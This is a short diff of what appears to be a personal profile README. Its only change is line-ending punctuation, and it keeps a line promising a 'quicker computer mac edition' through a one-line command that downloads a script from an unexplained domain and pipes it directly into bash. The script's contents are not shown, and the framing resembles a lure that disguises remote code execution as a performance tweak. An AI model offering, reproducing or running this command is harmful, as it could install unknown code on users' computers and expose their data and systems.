@@ -1,7 +1,7 @@
 ### Hi there 👋
-Always Finding Secrets \\
-if you want a quicker computer mac edition:\\
-`curl -Ls quicker.computer/Fr345T5GTRANDOMSTRING24n4t5|bash`\\
+Always Finding Secrets //
+if you want a quicker computer mac edition: //
+`curl -Ls quicker.computer/Fr345T5GTRANDOMSTRING24n4t5|bash` //
 a quicker windows script coming soon
 
 
